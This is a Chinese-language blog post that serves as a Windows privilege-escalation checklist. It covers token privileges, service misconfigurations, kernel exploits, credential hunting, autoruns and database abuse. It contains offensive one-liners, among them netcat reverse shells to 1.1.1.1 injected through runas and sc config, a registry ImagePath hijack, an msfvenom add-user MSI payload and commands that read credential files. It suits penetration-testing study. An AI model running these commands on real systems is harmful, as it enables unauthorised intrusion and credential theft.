
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/kqdssheng/p/18844363" title="发布于 2025-04-24 12:59">
    <span role="heading" aria-level="2">Windows 提权指南</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>男儿若遂平生志，五经勤向窗前读。</p>
</blockquote>
<hr>
<h2 id="导航">导航</h2>
<ul>
<li>
<p><a href="#id1" rel="noopener nofollow">壹 - Se 特权</a></p>
</li>
<li>
<p><a href="#id2" rel="noopener nofollow">贰 - RunAs</a></p>
</li>
<li>
<p><a href="#id3" rel="noopener nofollow">叁 - 弱服务</a></p>
</li>
<li>
<p><a href="#id4" rel="noopener nofollow">肆 - Windows 内核</a></p>
</li>
<li>
<p><a href="#id5" rel="noopener nofollow">伍 - 密码搜寻</a></p>
</li>
<li>
<p><a href="#id6" rel="noopener nofollow">陆 - 杂项</a></p>
<ul>
<li><a href="#id6.1" rel="noopener nofollow">AlwaysInstallElevated</a></li>
<li><a href="#id6.2" rel="noopener nofollow">开机自启</a></li>
</ul>
</li>
<li>
<p><a href="#id7" rel="noopener nofollow">柒 - 服务程序</a></p>
<ul>
<li><a href="#id7.1" rel="noopener nofollow">MSSQL</a></li>
<li><a href="#id7.2" rel="noopener nofollow">MySQL UDF</a></li>
<li><a href="#id7.3" rel="noopener nofollow">PrintNightmare</a></li>
<li><a href="#id7.4" rel="noopener nofollow">不安全的 GUI 程序</a></li>
</ul>
</li>
<li>
<p><a href="#id8" rel="noopener nofollow">捌 - 自动化工具</a></p>
</li>
</ul>
<hr>
<h2 id="壹---se-特权"><div id="id1">壹 - Se 特权</div></h2>
<ol>
<li>检查当前用户是否拥有感兴趣的 <strong>Se 特权</strong>，如 SeImpersonatePrivilege/SeAssignPrimaryPrivilege、SeBackupPrivilege、SeRestorePrivilege/SeTakeOwnershipPrivilege 等。【命令 <code>whoami /priv</code> 】</li>
<li>若拥有 <strong>SeImpersonatePrivilege</strong> 特权，则展开土豆提权。【<a href="https://www.cnblogs.com/kqdssheng/p/18738762" target="_blank">利用方法</a>】</li>
<li>若拥有 <strong>SeBackupPrivilege</strong> 特权，则需先进行 SAM/SYSTEM 文件提取，然后开始 PTH 攻击提权。【<a href="https://www.cnblogs.com/kqdssheng/p/18741609" target="_blank">利用方法</a>】</li>
<li>至于其它特权所拥有的可利用特性，可根据此<a href="https://github.com/gtworek/Priv2Admin" target="_blank" rel="noopener nofollow">仓库</a>内容进行研究探索。</li>
</ol>
<h2 id="贰---runas"><div id="id2">贰 - RunAs</div></h2>
<ol>
<li>检查当前环境是否拥有任何<strong>存储的凭证</strong>。【命令 <code>cmdkey /list</code> 】</li>
<li>若<strong>发现凭证</strong>，则可使用 <code>runas /env /noprofile /savecred /user:admin "c:\temp\nc.exe 1.1.1.1 443 -e cmd.exe"</code> 来进行权限移动。</li>
<li>若通过下文的密码搜寻获得了<strong>用户的密码信息</strong>，则可参考该<a href="https://www.cnblogs.com/kqdssheng/p/18751119#id2" target="_blank">文章</a>进行权限移动。</li>
</ol>
<h2 id="叁---弱服务"><div id="id3">叁 - 弱服务</div></h2>
<ol>
<li>弱服务的枚举最好还是通过工具 <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener nofollow">PowerUp</a> 和 <a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS" target="_blank" rel="noopener nofollow">winPEAS</a> 去自动分析，手工分析较为繁琐。弱服务类别如下：</li>
<li>弱<strong>服务</strong>权限：用户对服务自身具有修改权限，故可通过 sc 命令修改服务的启动程序路径或服务启动身份。【命令 <code>sc config Juggernaut binPath= "C:\temp\nc.exe 1.1.1.1 443 -e C:\windows\system32\cmd.exe"</code> 】【<a href="https://www.cnblogs.com/kqdssheng/p/18779558#id4" target="_blank">更多详情</a>】</li>
<li>弱<strong>注册表</strong>权限：用户对服务所对应的注册表具有写入权限，故可通过 reg 命令<strong>间接修改</strong>服务启动程序路径或服务启动身份的动作。【命令 <code>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Juggernaut" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\shell.exe" /f</code>】【<a href="https://www.cnblogs.com/kqdssheng/p/18785725#id3" target="_blank">更多详情</a>】</li>
<li>弱<strong>文件/目录</strong>权限：用户对服务启动程序所在目录具有写入权限，故可对启动程序进行替换。【<a href="https://www.cnblogs.com/kqdssheng/p/18771857#id4" target="_blank">更多详情</a>】</li>
<li><strong>未引用</strong>的服务路径：（1）服务启动程序的绝对路径存在空格且没有使用双引号包裹，触发系统按照<strong>路径优先级</strong>逐层查找可执行文件。（2）在逐层查找的路径中，用户对其中一个目录具有写入权限。（3）依此在目录下写入一个 <strong>对应名称</strong> 的恶意程序。【<a href="https://www.cnblogs.com/kqdssheng/p/18779548#id1" target="_blank">更多详情</a>】</li>
<li><strong>DLL</strong> 劫持：类似“弱<strong>文件/目录</strong>权限”中替换服务启动程序一样，DLL 劫持会对服务启动程序所加载的 DLL 文件进行直接替换或间接劫持。
<ol>
<li><strong>直接替换</strong>要求用户对服务启动程序所在目录具有写入权限。【注：既如此，何不直接替换启动程序】【<a href="https://www.cnblogs.com/kqdssheng/p/18782860#id2" target="_blank">更多详情</a>】</li>
<li><strong>间接劫持</strong>需要分析服务启动时会加载哪些 DLL，同时需要对 <strong>DLL 标准搜索目录</strong>其中之一具有写入权限。【注：这种只对已知通用的服务有效果】【<a href="https://www.cnblogs.com/kqdssheng/p/18782860#id3" target="_blank">更多详情</a>】</li>
<li>一些利用系统 DLL 加载进行攻击的仓库推荐：
<ol>
<li><a href="https://github.com/xct/diaghub" target="_blank" rel="noopener nofollow">https://github.com/xct/diaghub</a></li>
<li><a href="https://github.com/itm4n/UsoDllLoader" target="_blank" rel="noopener nofollow">https://github.com/itm4n/UsoDllLoader</a></li>
<li><a href="https://github.com/sailay1996/WerTrigger" target="_blank" rel="noopener nofollow">https://github.com/sailay1996/WerTrigger</a></li>
</ol>
</li>
</ol>
</li>
</ol>
<blockquote>
<p>注意：在对服务进行利用之前，先知悉自己有没有触发服务重启的能力（重启服务[sc start *]、重启电脑），否则做了也是无用工。</p>
</blockquote>
<h2 id="肆---windows-内核"><div id="id4">肆 - Windows 内核</div></h2>
<ol>
<li>
<p>查看 OS 版本信息，确认 Windows 的新旧版本。【命令 <code>systeminfo</code> 】</p>
</li>
<li>
<p><strong>Windows XP/7/Server 2008/Server 2012/其它更旧版本</strong> 都称为旧版 Windows 系统。旧版 Windows 系统可将 systeminfo.txt 内容交给自动工具 <a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noopener nofollow">wesng</a> 和 <a href="https://github.com/7Ragnarok7/Windows-Exploit-Suggester-2" target="_blank" rel="noopener nofollow">Windows Exploit Suggester 2</a> 去离线分析，或在受害机本机使用 <a href="https://github.com/rasta-mouse/Sherlock" target="_blank" rel="noopener nofollow">sherlock.ps1</a> 脚本去分析，分析结果中交集的漏洞可优先实验。【<a href="https://www.cnblogs.com/kqdssheng/p/18765857" target="_blank">更多详情</a>】</p>
</li>
<li>
<p><strong>Windows 10/Server 2016/Server 2019/ 其它更新版本</strong> 都称为新版 Windows 系统。新版 Windows 系统建议使用自动工具 <a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS" target="_blank" rel="noopener nofollow">winPEAS</a>去受害机本地分析，或通过 kali 内置工具 <strong>Searchsploit</strong> 去离线手工查找。【<a href="https://www.cnblogs.com/kqdssheng/p/18768236" target="_blank">更多详情</a>】</p>
</li>
<li>
<p>优质内核漏洞利用<strong>推荐</strong>：</p>
<ol>
<li><a href="https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527" target="_blank" rel="noopener nofollow">PrintNightmare</a>：几乎所有受支持的 Windows 版本。</li>
<li><a href="https://github.com/KaLendsi/CVE-2022-21882" target="_blank" rel="noopener nofollow">cve_2022_21882_win32k</a>【MSF 亦支持】：几乎覆盖 Win10 所有版本。</li>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener nofollow">其它已编译的内核漏洞</a></li>
</ol>
</li>
</ol>
<blockquote>
<p>注意：Windows 内核漏洞的众多利用程序中，有一些是需要在 GUI 环境才能够正常使用的，这一点需特别注意。</p>
</blockquote>
<h2 id="伍---密码搜寻"><div id="id5">伍 - 密码搜寻</div></h2>
<ol>
<li>无人值守文件常见路径，如下：
<ol>
<li><code>C:\unattend.xml</code></li>
<li><code>C:\Windows\Panther\Unattend.xml</code></li>
<li><code>C:\Windows\Panther\Unattend\Unattend.xml</code></li>
<li><code>C:\Windows\system32\sysprep.xml</code></li>
<li><code>C:\Windows\system32\sysprep\sysprep.xml</code></li>
</ol>
</li>
<li>用户家目录中的 <code>*.* </code> 文件 。【命令 <code>dir /s /b c:\users\ | findstr .*\..*</code> 】</li>
<li>PowerShell 历史文件
<ol>
<li><code>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></li>
<li><code>cat (Get-PSReadlineOption).HistorySavePath</code></li>
</ol>
</li>
<li>IIS 配置和 Web 文件
<ol>
<li><code>Get-Childitem -Recurse C:\inetpub | findstr -i "directory config txt aspx ps1 bat xml pass user"</code>  结果中的 web.config、connectionstrings.config 文件，或类似的 config 文件。</li>
<li>除了 IIS 默认使用的 <code>C:\inetpub</code> 目录外，还有这些目录值得注意：<code>C:\apache</code>、<code>C:\nginx</code>、<code>C:\xampp</code>、<code>C:\wamp</code>。</li>
</ol>
</li>
<li>若能够登录 SQL 数据库，则遍历 <strong>系统内置库/用户自建库</strong> 中用户表中的账户密码。</li>
</ol>
<h2 id="陆---杂项"><div id="id6">陆 - 杂项</div></h2>
<h4 id="1alwaysinstallelevated"><div id="id6.1">1、AlwaysInstallElevated</div></h4>
<ol>
<li>
<p>检查 AlwaysInstallElevated 功能是否开启。【值为 1 表示功能已启用】</p>
<pre><code class="language-cmd">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
</code></pre>
</li>
<li>
<p>制作载荷 <code>msfvenom -p windows/adduser USER=msi PASS=pass@123 -f msi -o /root/add.msi</code></p>
</li>
</ol>
<h4 id="2开机自启"><div id="id6.2">2、开机自启</div></h4>
<ol>
<li>自启应用-目录：<code>icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"</code>【有写权限时，将程序或 bat 放入即可。】</li>
<li>自启应用-注册表：<code>reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"</code>【（1）有注册表写权限时，可以在此键下面创建新键；（2）观察其中的子键程序路径，查看是否存在<strong>弱目录权限</strong>或<strong>程序路径未引用</strong>的问题。】</li>
</ol>
<blockquote>
<p>注: 上述注册表路径中与 Run 同路径下的其它键 RunOnce、R、Runex、Runonceex 亦值得关注。RunOnce 子键中的程序在执行一次之后，该子键便被删除了。</p>
</blockquote>
<h2 id="柒---服务程序"><div id="id7">柒 - 服务程序</div></h2>
<blockquote>
<p>在此之前，首先通过命令 <code> netstat -anop tcp | findstr.exe LISTENING</code> 确定在此系统中有哪些运行的服务可能是我们感兴趣的。</p>
</blockquote>
<h4 id="1mssql"><div id="id7.1">1、MSSQL</div></h4>
<ol>
<li>利用场景1：（1）拥有数据库登录账户，且能执行 xp_dirtree 指令。（2）尝试通过responder 捕获 MSSQL 服务账户的 NetNTLMv2 哈希值进行破解尝试。【<a href="https://www.cnblogs.com/kqdssheng/p/18757951#id3" target="_blank">利用方法</a>】</li>
<li>利用场景2：（1）拥有数据库管理员账户 sa。（2）通过 xp_cmdshell 指令获得服务账户权限的 shell 反向连接。【<a href="https://www.cnblogs.com/kqdssheng/p/18757951#id3" target="_blank">利用方法</a>】</li>
<li><strong>注意</strong>：（1）获得的任何 MSSQL 数据库账户都值得去尝试是否有权限去执行 xp_dirtree、xp_cmdshell 指令，因为权限分配不严谨的问题时有发生。（2）任何服务账户的 Se 特权都可能比普通账户要多，故突破点也会变多，因此任何服务账户的获得都可能会出现意外惊喜。</li>
</ol>
<h4 id="2mysql-udf"><div id="id7.2">2、MySQL UDF</div></h4>
<ol>
<li>利用条件：(1) mysqld 进程以管理员或 SYSTEM 身份运行。(2) 拥有高权限的数据库登录账户，如 root。(3) mysql 版本符合 4.x/5.x/[6.x?]。【命令 <code>mysql -V</code>】</li>
<li>利用方法：<a href="https://www.cnblogs.com/kqdssheng/p/18254942" target="_blank">参考链接1</a>、<a href="https://xz.aliyun.com/t/2199?time__1311=n4%2Bxni0%3DE4BD0Djx0ykfDuexgDmEpnnerzoD" target="_blank" rel="noopener nofollow">参考链接2</a>。</li>
<li>获取方式：命令 ``searchsploit mysql udf`，id1518。</li>
</ol>
<h4 id="3printnightmare"><div id="id7.3">3、PrintNightmare</div></h4>
<ol>
<li>利用场景1-RCE：（1）拥有一个标准用户凭证。（2）远程枚举 Print Spooler 服务正在运行。【命令 <code>rpcdump.py @1.1.1.1 | egrep 'MS-RPRN|MS-PAR'</code>】【<a href="https://www.cnblogs.com/kqdssheng/p/18753135#id1" target="_blank">利用方法</a>】</li>
<li>利用场景2-LPE：本地检查 Print Spooler 服务正在运行。【命令 <code>sc query Spooler</code> 】【<a href="https://www.cnblogs.com/kqdssheng/p/18753135#id2" target="_blank">利用方法</a>】</li>
</ol>
<h4 id="4不安全的-gui-程序"><div id="id7.4">4、不安全的 GUI 程序</div></h4>
<ol>
<li>利用条件：（1）已获得 GUI 交互界面。（2）搜寻那些默认以 auto-elevated 高权限运行的程序。</li>
<li>值得尝试的程序推荐：
<ol>
<li>CompMgmtLauncher.exe</li>
<li>eventvwr.exe</li>
<li>taskschd.msc</li>
<li>控制面板-疑难解答-帮助和支持-打开命令提示符窗口。【win7 之前有该功能，win0 已移除。】</li>
</ol>
</li>
</ol>
<blockquote>
<p>注：这些程序可能并不能够成功提权，但它们还有另一个作用是可以进行 UAC 绕过。虽然很鸡肋，但这个技巧还是值得保留。</p>
</blockquote>
<h2 id="捌---自动化工具"><div id="id8">捌 - 自动化工具</div></h2>
<ol>
<li><a href="https://github.com/peass-ng/PEASS-ng" target="_blank" rel="noopener nofollow">PEASS-ng</a></li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener nofollow">PowerUp</a></li>
<li><a href="https://github.com/GhostPack/Seatbelt" target="_blank" rel="noopener nofollow">Seatbelt</a></li>
<li><a href="https://github.com/itm4n/PrivescCheck" target="_blank" rel="noopener nofollow">PrivescCheck</a></li>
</ol>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.05825648993518519" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-04-24 12:59">2025-04-24 12:59</span>&nbsp;
<a href="https://www.cnblogs.com/kqdssheng">扛枪的书生</a>&nbsp;
阅读(<span id="post_view_count">51</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18844363);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18844363', targetLink: 'https://www.cnblogs.com/kqdssheng/p/18844363', title: 'Windows 提权指南' })">举报</a>
</div>
        